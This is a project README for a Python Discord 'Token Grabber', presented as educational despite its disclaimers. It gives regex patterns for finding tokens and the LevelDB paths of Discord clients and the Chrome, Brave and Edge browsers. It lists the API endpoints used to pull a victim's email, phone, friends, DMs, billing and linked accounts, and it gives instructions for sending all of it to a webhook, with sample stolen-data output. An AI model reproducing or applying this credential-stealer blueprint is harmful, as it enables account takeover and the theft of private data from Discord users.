# 🛡️ TOKEN GRABBER - PYTHON SCRIPT

**A powerful, open-source tool for educational and security research purposes that demonstrates how Discord tokens are stored locally and how they can be extracted for security awareness.**

![Version](https://img.shields.io/badge/version-2.1.0-blue)
![Python](https://img.shields.io/badge/python-3.8+-green)
![License](https://img.shields.io/badge/license-MIT-red)
![Status](https://img.shields.io/badge/status-stable-brightgreen)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)

---

## ⚠️ DISCLAIMER - READ THIS FIRST

> **🚨 IMPORTANT: This tool is provided SOLELY FOR EDUCATIONAL AND RESEARCH PURPOSES.**
> **IT EXTRACTS DISCORD TOKENS AND RETRIEVES USER DATA VIA DISCORD API.**

> **⛔ YOU ARE NOT ALLOWED TO:**
> - ❌ Use this tool for malicious purposes
> - ❌ Use this tool without explicit consent from all parties involved
> - ❌ Violate Discord's Terms of Service
> - ❌ Share, sell, or distribute collected data
> - ❌ Target individuals without their knowledge
> - ❌ Use this for harassment, doxxing, or illegal activity
> - ❌ Deploy on systems you do not own or lack authorization to test

> **✅ YOU ARE ALLOWED TO:**
> - ✔️ Use this in controlled, consensual security testing environments
> - ✔️ Educate others about token security and privacy risks
> - ✔️ Test your own systems and networks
> - ✔️ Report security vulnerabilities responsibly
> - ✔️ Learn how Discord stores authentication tokens
> - ✔️ Understand how token-based authentication works
> - ✔️ Conduct authorized penetration testing with written consent

> **👨‍⚖️ The author is NOT responsible for any misuse or damage caused by this tool.**
>
> *By downloading, installing, or using this tool, you agree to take FULL responsibility for your actions.*

---

## 📖 What is This?

**Token Grabber** is a Python-based utility that extracts Discord tokens from local storage databases and retrieves associated user information via the Discord API.

### 🔍 How It Works

| # | Step | Description |
|---|------|-------------|
| 1️⃣ | **Scan for tokens** | Scans Local Storage and LevelDB files on the target system |
| 2️⃣ | **Extract tokens** | Uses regex patterns to find JWT-format tokens |
| 3️⃣ | **Validate tokens** | Validates token structure and decodes base64 tokens |
| 4️⃣ | **Query Discord API** | Queries Discord API for user information using each token |
| 5️⃣ | **Collect data** | User info, friends, guilds, DMs, billing, connections |
| 6️⃣ | **Send webhook** | Sends all data to Discord via webhook |
| 7️⃣ | **Save to file** | Saves data to tokens.json file |

### 🎯 What Data Is Collected

| Category | Data |
|----------|------|
| 👤 **User Info** | ID, Username, Discriminator, Email, Phone, Nitro Status |
| 👥 **Friends** | All friends with usernames and IDs |
| 🏠 **Servers** | Server names, IDs, member counts, permissions |
| 💬 **DMs** | Recent direct message channels |
| 💳 **Billing** | Subscription information (Nitro, etc.) |
| 🔗 **Connected Accounts** | Linked accounts (Twitch, YouTube, Spotify, etc.) |

### 🎯 Why This Matters

Discord uses tokens as authentication credentials. These tokens are stored locally on the user's machine. Understanding how they are stored and what information they can access is important for:
- 🔒 Security awareness and education
- 🛡️ Protecting against credential theft
- 🧠 Understanding authentication mechanisms
- 🔐 Improving personal security practices

---

## ⚡ Features

| 🏷️ Feature | 📝 Description |
|------------|----------------|
| 🔍 **Token Extraction** | Scans LevelDB for Discord tokens |
| 🌐 **Multi-Platform** | Supports Windows, Linux, and MacOS |
| 🔑 **Multi-Client** | Discord, Canary, PTB, Development |
| 🌐 **Browser Support** | Chrome, Brave, Edge (LevelDB scan) |
| 🔐 **Token Validation** | Validates JWT structure and decodes base64 |
| 📊 **Discord API Client** | Retrieves user data via Discord API |
| 👥 **Friends List** | Extracts all friends from account |
| 🏠 **Guilds/Servers** | Lists all servers the user is in |
| 💬 **Direct Messages** | Gets recent DM channels |
| 💳 **Billing Info** | Checks for Nitro subscriptions |
| 🔗 **Connected Accounts** | Linked third-party accounts |
| ⚡ **Multi-Threading** | Fast concurrent token processing |
| 📨 **Webhook Support** | Discord webhook integration |
| 💾 **JSON Output** | Saves data to tokens.json |
| 🛡️ **Error Handling** | Graceful failure handling |

---

## 🔧 Installation

### 📋 What You Need Before Starting

| ✅ Item | ℹ️ Description |
|---------|----------------|
| 🐍 Python 3.8+ | Installed on your computer |
| 🎮 Discord Account | A server/channel you control |
| 🔗 Discord Webhook URL | Created from your Discord server settings |
| 💻 Command Line | Basic knowledge of terminal/command prompt |
| 📦 pip | Python package manager |

### 📥 Step 1: Get the Code

Open your terminal/command prompt and run:

```bash
git clone https://github.com/your-repo/token-grabber.git
cd token-grabber
💡 Tip: If you don't have Git installed, download the ZIP file from GitHub and extract it.

📦 Step 2: Install Required Python Libraries
bash
pip install requests
pip install discord-webhook
Or install both at once:

bash
pip install requests discord-webhook
🔗 Step 3: Create a Discord Webhook
#	Action
1️⃣	Open Discord and go to your server/channel
2️⃣	Click the gear icon (Server Settings)
3️⃣	Click on "Integrations" in the left sidebar
4️⃣	Click on "Webhooks"
5️⃣	Click "New Webhook"
6️⃣	Give it a name (e.g., "Token Grabber")
7️⃣	Click "Copy Webhook URL"
⚠️ Warning: Keep your webhook URL secret! Anyone with it can receive your logs.

⚙️ Step 4: Configure the Script
Open the script in a text editor and set:

python
WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"  # 🔴 REQUIRED
🚀 Step 5: Run the Script
bash
python token_grabber.py
The script will:

🔍 Scan for tokens in all Discord clients and browsers

🌐 Query Discord API for user data

📨 Send data via webhook

💾 Save data to tokens.json

🚀 Usage
📝 Basic Usage
#	Step
1️⃣	python token_grabber.py
2️⃣	Script scans for tokens automatically
3️⃣	Data is sent to your Discord webhook
4️⃣	Data is saved to tokens.json
📊 Example Console Output
text
[ℹ️] Starting token extraction...
[✅] Found 5 tokens
[🔍] Processing token: mfa.xxxxxxxxxxxx
[✅] Valid token found!
[👤] Username: User#1234
[🏠] Servers: 25
[👥] Friends: 50
[💰] Nitro: True
[📨] Sending webhook...
[✅] Webhook sent successfully!
[💾] Saved to tokens.json
📨 Example Webhook Output (Discord Embed)
text
📊 Discord Token Dump
────────────────────────────
🔑 Token: `mfa.xxxxxxxxxxxx`

👤 User: User#1234 (ID: 123456789)
📧 Email: user@email.com
📱 Phone: N/A
💎 Nitro: ✅ Yes

👥 Friends: 50 friends
🏠 Servers: 25 servers
💬 Recent DMs: Alice, Bob, Charlie

🔗 Connected Accounts: twitch: user, spotify: user
💳 Billing: Active subscription found
────────────────────────────
🕐 Timestamp: 2026-08-28 14:32:10
💾 JSON Output (tokens.json)
json
[
  {
    "token": "mfa.xxxxxxxxxxxx",
    "user_id": "123456789",
    "username": "User",
    "discriminator": "1234",
    "email": "user@email.com",
    "phone": null,
    "nitro": true,
    "friends": [
      {
        "id": "987654321",
        "username": "Friend",
        "discriminator": "5678"
      }
    ],
    "guilds": [
      {
        "id": "111111111",
        "name": "Server 1",
        "owner": false
      }
    ],
    "dms": [
      {
        "id": "222222222",
        "type": 1,
        "recipients": [
          {
            "id": "333333333",
            "username": "DMUser"
          }
        ]
      }
    ],
    "billing": {
      "subscriptions": [
        {
          "type": 1,
          "plan": "nitro_classic"
        }
      ]
    },
    "connected_accounts": [
      {
        "type": "twitch",
        "name": "twitch_user"
      }
    ]
  }
]
⚙️ Technical Details
🔑 Token Patterns
The script uses the following regex patterns to detect Discord tokens:

Pattern	Description
[\w-]{24}\.[\w-]{6}\.[\w-]{27}	Standard JWT token
mfa\.[\w-]{84}	MFA token
[\w-]{24}\.[\w-]{6}\.[\w-]{38}	Extended JWT token
🔐 Token Validation
Tokens are validated by:

Checking the number of parts (3 or 4)

Verifying the header contains valid base64url characters

Attempting base64 decode of the token

🌐 Discord API Endpoints
Endpoint	Purpose
GET /api/v10/users/@me	User information
GET /api/v10/users/@me/relationships	Friends list
GET /api/v10/users/@me/guilds	Servers list
GET /api/v10/users/@me/channels	DM channels
GET /api/v10/users/@me/billing/subscriptions	Billing info
GET /api/v10/users/@me/connections	Connected accounts
GET /api/v10/oauth2/@me	Token information
📂 Storage Paths
Discord Clients:

Platform	Path
Windows	%APPDATA%\Discord\Local Storage\leveldb
Linux	$HOME/.config/discord/Local Storage/leveldb
Mac	$HOME/Library/Application Support/discord/Local Storage/leveldb
Browsers:

Browser	Path
Chrome	%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb
Brave	%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb
Edge	%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb
📊 Tested Platforms
🖥️ Platform	📊 Status	📝 Notes
Windows 11	✅ FULL	All features functional
Windows 10	✅ FULL	All features functional
Windows 8.1	⚠️ PART	Some paths may differ
Windows 7	⚠️ PART	Limited functionality
Ubuntu 20.04+	✅ FULL	All features functional
Fedora 35+	✅ FULL	All features functional
macOS 10.15+	✅ FULL	All features functional
🛡️ Privacy & Security
⚖️ Legal Guidelines
📚 This tool is intended for educational purposes only.

✅ DO	❌ DON'T
Obtain explicit consent	Use without consent
Educate about security	Share or misuse data
Test in controlled environments	Target individuals
Report vulnerabilities	Violate Discord ToS
🔒 Where the Data Goes
Destination	Status
Discord Webhook	✅ Only destination
Server Storage	❌ Not stored
Third Parties	❌ Not shared
Log Files	❌ Not logged
🛡️ Protecting Yourself
Action	Why
🔐 Keep webhook URL secret	Anyone with it can receive your data
🔒 Use HTTPS	Encrypts traffic
📁 Don't share logs	Contains sensitive information
🗑️ Delete old webhooks	Prevents unauthorized access
🔒 Privacy Considerations
This script can retrieve:

📧 Email addresses

📱 Phone numbers

👥 Full friends list

🏠 Server memberships

💳 Billing information

🔗 Connected third-party accounts

⚠️ This information is highly sensitive. Handle with extreme care.

🐞 Troubleshooting
🔧 Common Issues and Fixes
❌ Issue	✅ Solution
ModuleNotFoundError: 'requests'	Run pip install requests
ModuleNotFoundError: 'discord_webhook'	Run pip install discord-webhook
"Access denied" error	Run as Administrator (Windows) or with sudo (Linux/Mac)
No tokens found	Ensure Discord is logged in
Webhook not sending	Check WEBHOOK_URL is correct
Invalid token error	Token may be expired/invalid
Script crashes on start	Verify Python 3.8+ and dependencies
LevelDB files not found	Check Discord is installed
🔢 Error Codes
Code	Meaning
200	✅ OK - API request successful
401	🔑 Unauthorized - Invalid/expired token
403	🚫 Forbidden - Insufficient permissions
404	📂 Not Found - Endpoint or resource not found
429	⏳ Rate Limited - Too many API requests
500	❌ Internal Server Error - Discord API error
📝 License
This project is licensed under the MIT License.

✅ Allowed	⚠️ Required
Use for any purpose	Include copyright notice
Modify the code	Include license text
Distribute copies	Provide warranty disclaimer
This software is provided "AS IS" without warranty of any kind.

👨‍💻 Author
palofsc (palo)

Platform	Handle
🐦 GitHub	github.com/palofsc
🎮 Discord	palofsc#0001
📧 Email	palofsc@proton.me
⭐ Support
If you find this tool useful for educational purposes:

Action	Why
⭐ Star the repository	Shows appreciation
🐛 Report issues	Helps improve the tool
🔧 Submit pull requests	Contribute code
📚 Share this	Educate others about token security
📌 Final Notes
🔬 This tool is a demonstration of how Discord tokens are stored and retrieved from local systems. The purpose is EDUCATION, not exploitation.

Token security is critical for account protection. Understanding how tokens work helps both security professionals and everyday users protect themselves from credential theft.

Key takeaways:

🔑 Never share your tokens with anyone

🔒 Discord tokens are equivalent to passwords

📡 Tokens can expose all account data

🛡️ Always use 2FA to protect your account

🧠 Use this knowledge to improve security awareness

⚠️ REMINDER: This tool is for EDUCATIONAL PURPOSES ONLY. Unauthorized use is illegal and strictly prohibited.

Made with ❤️ for educational & security research purposes

📅 Last Updated: 28/08/2026
